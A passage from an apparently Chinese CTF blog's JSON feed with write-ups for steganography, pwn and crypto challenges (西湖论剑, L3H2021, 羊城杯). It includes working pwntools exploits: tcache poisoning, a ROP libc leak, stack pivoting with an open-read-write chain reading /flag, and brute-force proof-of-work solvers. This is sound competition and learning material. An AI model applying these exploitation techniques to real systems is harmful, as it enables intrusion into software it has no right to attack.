/>\n<strong>exp：</strong> <code>aaaaaaaaaaaa/*aaaa/*aaaaaaaa</code></p>\n",
            "tags": [
                "Python",
                "CTF",
                "Misc",
                "Pwn"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-YUSA%E7%9A%84%E5%B0%8F%E7%A7%98%E5%AF%86/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-YUSA%E7%9A%84%E5%B0%8F%E7%A7%98%E5%AF%86/",
            "title": "西湖论剑_YUSA的小秘密",
            "date_published": "2021-11-29T15:02:55.000Z",
            "content_html": "<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"yusa的小秘密\"><a class=\"anchor\" href=\"#yusa的小秘密\">#</a> YUSA 的小秘密</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL25vbmVTeWNhbW9yZS9hbm5leC95dXNhX3NtYWxsX3NlY3JldC56aXA=\">附件下载</span><br />\n题目描述：LSB，但又不是 LSB，众所周知不止 RGB...<br />\n 直接用 stegsolve 打开有两个通道能直接看到 flag，可是噪点实在太多了.<br />\n 联想到题目描述，开始查找资料.<br />\n 可以参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ieXRlY3RmLmZlaXNodS5jbi9kb2NzL2RvY2NucXpwR0NXSDFoa0RmNWxqR2RqT0pZZyNxSFJVQ1I=\"> Bytectf2020 的 Misc: Hardcore Watermark 01</span> 这道题</p>\n<blockquote>\n<p>图片中每个像素可以通过三个通道来表示，常见的是 <strong>R</strong> (red) <strong>G</strong> (green) <strong>B</strong> (blue) 模式。而本题用到的通道是 YCrCb。</p>\n</blockquote>\n<p>通过  <code>cv2.cvtColor(img, cv2.COLOR_BGR2YCrCb)</code>  对 img 图片数据进行色彩空间转换，<br />\n然后保存图片：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> cv2 <span class=\"keyword\">import</span> cv2</span><br><span class=\"line\">img = cv2.imread(<span class=\"string\">&#x27;Yusa.png&#x27;</span>)</span><br><span class=\"line\">cv_color = cv2.cvtColor(img, cv2.COLOR_BGR2YCrCb)</span><br><span class=\"line\">cv2.imwrite(<span class=\"string\">&#x27;img.png&#x27;</span>, cv_color)</span><br></pre></td></tr></table></figure><br />\n 再用 stegsolve 看一下通道就可以了<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436506/Typera/2023/04/0c489cb73329a1ef49146321f8fde3bd.png\" alt=\"image-20230425232822379\" /></p>\n",
            "tags": [
                "Python",
                "CTF",
                "Misc"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/L3H2021-PWN/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/L3H2021-PWN/",
            "title": "L3H2021 PWN部分",
            "date_published": "2021-11-29T14:47:41.000Z",
            "content_html": "<h2 id=\"spn1126\"><a class=\"anchor\" href=\"#spn1126\">#</a> spn(11.26)</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL25vbmVTeWNhbW9yZS9hbm5leC9wd25fc3BuLnppcA==\">附件下载</span><br />\n复现这道题的时候，我一开始用的是 0RAYS 的解法，大致是找 spn 的解密脚本，计算给出的 shell 的真实地址，然后用 tcache 打 shell，最后选 5 进 backdoor.<br />\n 虽说是读懂了 0RAYS 的脚本，而且也算是进一步学习了一下 tcache 的机制，<br />\n然而我一番搜索，着实找不到好用的 spn 解密脚本，就只好另寻出路.<br />\n0RAY 的脚本放上：</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch=<span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">local=<span class=\"number\">0</span></span><br><span class=\"line\">binary_name=<span class=\"string\">&#x27;SPN_ENC&#x27;</span></span><br><span class=\"line\">libc_name=<span class=\"string\">&#x27;lib/libc-2.27.so&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> local:</span><br><span class=\"line\">    p=process(<span class=\"string\">&quot;./&quot;</span>+binary_name)</span><br><span class=\"line\">    libc=ELF(<span class=\"string\">&quot;./&quot;</span>+libc_name)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    p=remote(<span class=\"string\">&#x27;124.71.194.126&#x27;</span>,<span class=\"number\">9999</span>)</span><br><span class=\"line\">    e=ELF(<span class=\"string\">&quot;./&quot;</span>+binary_name)</span><br><span class=\"line\">    libc=ELF(<span class=\"string\">&quot;./&quot;</span>+libc_name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">z</span>(<span class=\"params\">a=<span class=\"string\">&#x27;&#x27;</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> local:</span><br><span class=\"line\">        gdb.attach(p,a)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> a==<span class=\"string\">&#x27;&#x27;</span>:</span><br><span class=\"line\">            raw_input</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">ru=<span class=\"keyword\">lambda</span> x:p.recvuntil(x)</span><br><span class=\"line\">sl=<span class=\"keyword\">lambda</span> x:p.sendline(x)</span><br><span class=\"line\">sd=<span class=\"keyword\">lambda</span> x:p.send(x)</span><br><span class=\"line\">sa=<span class=\"keyword\">lambda</span> a,b:p.sendafter(a,b)</span><br><span class=\"line\">sla=<span class=\"keyword\">lambda</span> a,b:p.sendlineafter(a,b)</span><br><span class=\"line\">ia=<span class=\"keyword\">lambda</span> :p.interactive()</span><br><span class=\"line\"><span class=\"comment\"># 这里真的是学到了，不过也是我之前看大佬的wp太少的缘故，之前我还在傻傻地一个字一个字地敲(+_+)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leak_address</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(context.arch==<span class=\"string\">&#x27;i386&#x27;</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> u32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">    <span class=\"keyword\">else</span> :</span><br><span class=\"line\">        <span class=\"keyword\">return</span> u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cho</span>(<span class=\"params\">num</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;0.exit\\n&quot;</span>,<span class=\"built_in\">str</span>(num))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,idx</span>):</span><br><span class=\"line\">    cho(<span class=\"number\">1</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;Size:&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;Index:&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    cho(<span class=\"number\">3</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;Index:&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    cho(<span class=\"number\">4</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;Index:&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,size,data</span>):</span><br><span class=\"line\">    cho(<span class=\"number\">2</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;Index:&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;Size&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    sa(<span class=\"string\">&quot;Content&quot;</span>,data)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">backdoor</span>():</span><br><span class=\"line\">    cho(<span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decrypt</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    io = process(<span class=\"string\">&#x27;./spn_dec.py&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(x&amp;<span class=\"number\">0xffff</span>))</span><br><span class=\"line\">    a = <span class=\"built_in\">int</span>(io.recv()[:-<span class=\"number\">1</span>])</span><br><span class=\"line\">    io.close()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">spn_dec</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    a1 = decrypt(x)</span><br><span class=\"line\">    a2 = decrypt(x&gt;&gt;<span class=\"number\">16</span>)</span><br><span class=\"line\">    a3 = decrypt(x&gt;&gt;<span class=\"number\">32</span>)</span><br><span class=\"line\">    aa = a1+a2*<span class=\"number\">0x10000</span>+a3*<span class=\"number\">0x100000000</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(a3),<span class=\"built_in\">hex</span>(a2),<span class=\"built_in\">hex</span>(a1))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(aa)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> aa</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;gift:&quot;</span>)</span><br><span class=\"line\">shell_addr=<span class=\"built_in\">int</span>(ru(<span class=\"string\">&#x27;\\n&#x27;</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(shell_addr))</span><br><span class=\"line\">aa = spn_dec(shell_addr)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(aa))</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"number\">2</span>)</span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x26</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(aa)[:-<span class=\"number\">2</span>])</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"number\">3</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"number\">4</span>)</span><br><span class=\"line\">edit(<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"string\">b&#x27;aa&#x27;</span>)</span><br><span class=\"line\">backdoor()</span><br><span class=\"line\">ia()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 害，身为菜鸡，我连脚本都没大佬写得好看</span></span><br></pre></td></tr></table></figure><br />\n 然后，我找到了另一种解法，输入 0x1000，数组越界写了 shell，可以直接 backdoor</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436358/Typera/2023/04/0a873d7de40231b015e0a70c0c4466c6.png\" alt=\"image-20230425232554399\" /></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x20</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x1000</span>+<span class=\"number\">2</span>,<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">backdoor()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"checkin1127\"><a class=\"anchor\" href=\"#checkin1127\">#</a> checkin(11.27)</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL25vbmVTeWNhbW9yZS9hbm5leC9wd25fY2hlY2tpbi56aXA=\">附件下载</span></p>\n<h3 id=\"关于asan\"><a class=\"anchor\" href=\"#关于asan\">#</a> 关于 ASan</h3>\n<p>这道题使用了 ASan，是一种影子内存的技术。关于它的具体内容可以参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iZXN0d2luZy5tZS9BU2FuLWFuZC1BU2FuLWluLUNURiUyODBjdGYtYmFieWFlZ2lzJTI5Lmh0bWw=\">这篇文章</span><br />\n这里记录一点大致的内容<br />\n ASan 是 Google 开源的一个用于进行内存检测的工具，它由两个主要部分构成，插桩和动态运行库 (Run-time library)。<br />\n插桩主要是针对在 llvm 编译器级别对访问内存的操作 (store，load，alloca 等)，将它们进行处理。<br />\n动态运行库主要提供一些运行时的复杂的功能 (比如 poison/unpoison shadow memory) 以及将 malloc,free 等系统调用函数 hook 住<br />\n ASan 采用了直接内存映射策略，具体的映射策略如下所示<br />\n<strong> 64 位</strong></p>\n<blockquote>\n<p>Shadow = (Mem &gt;&gt; 3) + 0x7fff8000;</p>\n</blockquote>\n<p><strong>32 位</strong></p>\n<blockquote>\n<p>Shadow = (Mem &gt;&gt; 3) + 0x20000000;</p>\n</blockquote>\n<h3 id=\"关于orw\"><a class=\"anchor\" href=\"#关于orw\">#</a> 关于 orw</h3>\n<p><strong>由来：</strong><br />\n有些 pwn 题为了增加难度，会在程序初始化的时候增加 seccomp 函数，禁用掉除了 sys_open,sys_write,sys_read 以外的所有系统调用。也就是说我们无法通过 system（‘/bin/sh’）来 getshell，只能通过 o，r，w 这三个系统调用获取 flag。<br />\n<strong>漏洞利用：</strong><br />\n首先调用 open 函数打开 flag 文件。<br />\n然后读取 flag 文件。<br />\n最后通过 wirte 将 flag 打印出来。<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sys_open(<span class=\"string\">&quot;flag&quot;</span>)//读取flag</span><br><span class=\"line\">sys_read(<span class=\"string\">&quot;rax&quot;</span>,<span class=\"string\">&quot;rsp&quot;</span>,<span class=\"number\">0x40</span>)//rax为sysoopen的返回值，也就是flag，然后将flag写到esp下</span><br><span class=\"line\">sys_write(<span class=\"number\">1</span>,<span class=\"string\">&quot;rsp&quot;</span>,<span class=\"number\">0x40</span>)//打印flag的值到屏幕输出</span><br></pre></td></tr></table></figure><br />\n 害，还是知识不到位，这里再放一篇挺详细的<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY29kZWxlYWRpbmcuY29tL2FydGljbGUvNzIzMTU3MzU1MTgv\"> orw 介绍</span></p>\n<h3 id=\"分析\"><a class=\"anchor\" href=\"#分析\">#</a> 分析</h3>\n<p>pwn 内可以任意地址写一个字节，故修改 _ZN14__interception21real___isoc99_vfscanfE 的第二个字节，使其指向 gets 函数 (0x73ED28)<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436366/Typera/2023/04/38fe2a7349d7b29477d22b0f72026408.png\" alt=\"image-20230425232602805\" /></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sla(<span class=\"string\">b&#x27;Welcome! A gift for you:&#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0x73edb8</span>+<span class=\"number\">1</span>))</span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">sd(<span class=\"string\">b&#x27;\\x91&#x27;</span>)</span><br><span class=\"line\">sa(<span class=\"string\">b&#x27;Leave a note.&#x27;</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x1f</span>)</span><br><span class=\"line\">sa(<span class=\"string\">b&quot;That&#x27;s all. Have fun!&quot;</span>,p64(<span class=\"number\">0x43FBB3</span>))</span><br></pre></td></tr></table></figure><br />\n 构造 rop，调用 gets 函数，泄露 libc_addr 地址<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pop_rdi = <span class=\"number\">0x41af0b</span></span><br><span class=\"line\">pop_rsp = <span class=\"number\">0x484d50</span></span><br><span class=\"line\">call_puts = <span class=\"number\">0x43A286</span></span><br><span class=\"line\">rop = p64(pop_rdi)+p64(<span class=\"number\">0x72DE30</span>)+p64(call_puts)+<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x838</span>+p64(<span class=\"number\">0</span>)*<span class=\"number\">6</span>+p64(pop_rdi)+p64(<span class=\"number\">0xA00000</span>)+p64(<span class=\"number\">0x43FBB3</span>)+<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x30</span>+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(pop_rsp)+p64(<span class=\"number\">0xA00000</span>)</span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    sl(rop)</span><br><span class=\"line\">    libc_addr = leak_address()-<span class=\"number\">0x407e0</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_addr))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> libc_addr == <span class=\"number\">0x736572605c61</span>:</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><br />\n 最后栈迁移 + orw 调用获取 flag 文件<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">binsh=libc_addr+<span class=\"number\">0x1B3E1A</span></span><br><span class=\"line\">system=libc_addr+<span class=\"number\">0x4f550</span></span><br><span class=\"line\">pop_rsi=<span class=\"number\">0x000000000041ab7c</span></span><br><span class=\"line\">pop_rdx=<span class=\"number\">0x000000000043ced2</span></span><br><span class=\"line\">open_addr=libc_addr+libc.sym[<span class=\"string\">&#x27;open&#x27;</span>]</span><br><span class=\"line\">read_addr=libc_addr+libc.sym[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">write_addr=libc_addr+libc.sym[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">rop2 = p64(pop_rdi)+p64(<span class=\"number\">0xA00100</span>)+p64(pop_rsi)+p64(<span class=\"number\">0</span>)+p64(open_addr)</span><br><span class=\"line\">rop2 += p64(pop_rdi)+p64(<span class=\"number\">3</span>)+p64(pop_rsi)+p64(<span class=\"number\">0xA00200</span>)+p64(pop_rdx)+p64(<span class=\"number\">0x100</span>)+p64(read_addr)</span><br><span class=\"line\">rop2 += p64(pop_rdi)+p64(<span class=\"number\">1</span>)+p64(pop_rsi)+p64(<span class=\"number\">0xA00200</span>)+p64(pop_rdx)+p64(<span class=\"number\">0x100</span>)+p64(write_addr)</span><br><span class=\"line\">rop2 = rop2.ljust(<span class=\"number\">0x100</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+<span class=\"string\">b&#x27;/flag\\x00&#x27;</span></span><br><span class=\"line\">sl(rop2)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"slow_spn1129\"><a class=\"anchor\" href=\"#slow_spn1129\">#</a> slow_spn(11.29)</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL25vbmVTeWNhbW9yZS9hbm5leC9wd25fc2xvdy1zcG4uemlw\">附件下载</span><br />\n这题感觉挺奇怪的。。。<br />\n貌似除了 pwntools 工具，就没有用到啥和 pwn 相关的东西，主要的解题思路也没啥漏洞利用的感觉，大概属于密码。<br />\n程序的大概流程就是：从 flag 文件里面导出 key 和 plaintext，然后通过 s 盒和 p 盒放入 cache 里面.<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436377/Typera/2023/04/d98248de6bbcdd6c0a8ae6fa6d3523de.png\" alt=\"image-20230425232612526\" /><br />\ncache 是题目实现的，最多可以往里添加 0x20 个数（模拟访问 s 盒中的地址），超过了会剔除最小的一个，若是 cache 命中了则使用算法计数，未命中则 sleep (1)，<br />\n由于题目给了一次访问 plaintext 在 s 盒中的地址的机会，所以可以通过遍历来爆破，通过 sleep (1) 判断 cache 是否命中，然后推出上图中 p，v9，v7，v5 以及 k&gt;&gt;8，k&gt;&gt;4，k 的值，然后拼接得到 key.<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436385/Typera/2023/04/f5836a7db5ff249e037d1a839c975876.png\" alt=\"image-20230425232621850\" /></p>\n",
            "tags": [
                "Python",
                "CTF",
                "Pwn"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/2021-%E7%BE%8A%E5%9F%8E%E6%9D%AF-wp/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/2021-%E7%BE%8A%E5%9F%8E%E6%9D%AF-wp/",
            "title": "2021-羊城杯_wp",
            "date_published": "2021-11-26T10:21:00.000Z",
            "content_html": "<div class=\"note warning\">\n<p>文章时间太早，图片丢失</p>\n</div>\n<h2 id=\"crypto-ringringring\"><a class=\"anchor\" href=\"#crypto-ringringring\">#</a> Crypto-RingRingRing</h2>\n<p>连上后先是让我们输验证码，MD5，这个没什么好说的，爆破一下就出了。<br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/RRR1.png\" alt=\"\" /><br />\n然后让我们给出满足条件<br />\n <code>a**4 + b**4 + c**4 + d**4 = e**2</code> <br />\n 的 100 个 a,b,c,d,e<br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/RRR2.png\" alt=\"\" /><br />\n 依旧是爆破，判断 <code>sqrt(a**4 + b**4 + c**4 + d**4)</code>  的值为整数时，依次输出 a,b,c,d,e 就可以了，输出 100 个之后返回就可以得到 flag<br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/RRR3.png\" alt=\"\" /></p>\n<pre><code>from pwn import*\nfrom math import sqrt\nr=remote('192.168.39.25',2378)\ndef myhash(text):\n\tmysha = hashlib.md5()\n\tmysha.update(text)\n\treturn mysha.hexdigest()\n\ndef passPoW(plain, cipher):\n\tdic = string.digits+string.ascii_letters\n\tfor a0 in dic:\n\t\tfor a1 in dic:\n\t\t\tfor a2 in dic:\n\t\t\t\tfor a3 in dic:\n\t\t\t\t\tfor a4 in dic:\n\t\t\t\t\t\ttmp = bytes((str(a0)+str(a1)+str(a2)+str(a3)+str(a4)+str(plain)).encode())\n\t\t\t\t\t\tif(myhash(tmp)[0:5]==cipher):\n\t\t\t\t\t\t\treturn str(a0)+str(a1)+str(a2)+str(a3)+str(a4)\n\ndef q1():\n\tnum=0\n\tfor a in range(1,100):\n\t\tfor b in range(1,100):\n\t\t\tfor c in range(1,100):\n\t\t\t\tfor d in range(1,100):\n\t\t\t\t\tif(sqrt(a**4 + b**4 + c**4 + d**4)%1==0):\n\t\t\t\t\t\tprint(r.recvuntil('a:').decode())\n\t\t\t\t\t\tr.send(bytes(str(a).encode()))\n\t\t\t\t\t\t#print(bytes(str(a).encode()))\n\t\t\t\t\t\tprint(r.recvuntil('b:').decode())\n\t\t\t\t\t\tr.send(bytes(str(b).encode()))\n\t\t\t\t\t\t#print(bytes(str(b).encode()))\n\t\t\t\t\t\tprint(r.recvuntil('c:').decode())\n\t\t\t\t\t\tr.send(bytes(str(c).encode()))\n\t\t\t\t\t\t#print(bytes(str(c).encode()))\n\t\t\t\t\t\tprint(r.recvuntil('d:').decode())\n\t\t\t\t\t\tr.send(bytes(str(d).encode()))\n\t\t\t\t\t\t#print(bytes(str(d).encode()))\n\t\t\t\t\t\tprint(r.recvuntil('e:').decode())\n\t\t\t\t\t\tr.send(bytes(str(int(sqrt(a**4 + b**4 + c**4 + d**4))).encode()))\n\t\t\t\t\t\t#print(bytes(str(int(sqrt(a**4 + b**4 + c**4 + d**4))).encode()))\n\t\t\t\t\t\tprint(r.recvline())\n\t\t\t\t\t\tnum+=1\n\t\t\t\t\t\tprint(num)\n\t\t\t\t\t\tif(num == 100):\n\t\t\t\t\t\t\treturn\n\nst = r.recvuntil(b'\\n')\nprint(st.decode())\nplain = st[36:40].decode()\nprint(plain)\ncipher = st[50:-1].decode()\nprint(cipher)\nres = passPoW(plain, cipher)\nprint(res)\nprint(r.recv().decode())\nr.sendline(res.encode())\nq1()\nr.interactive()\n</code></pre>\n",
            "tags": [
                "Python",
                "Crypto",
                "CTF"
            ]
        },
        {
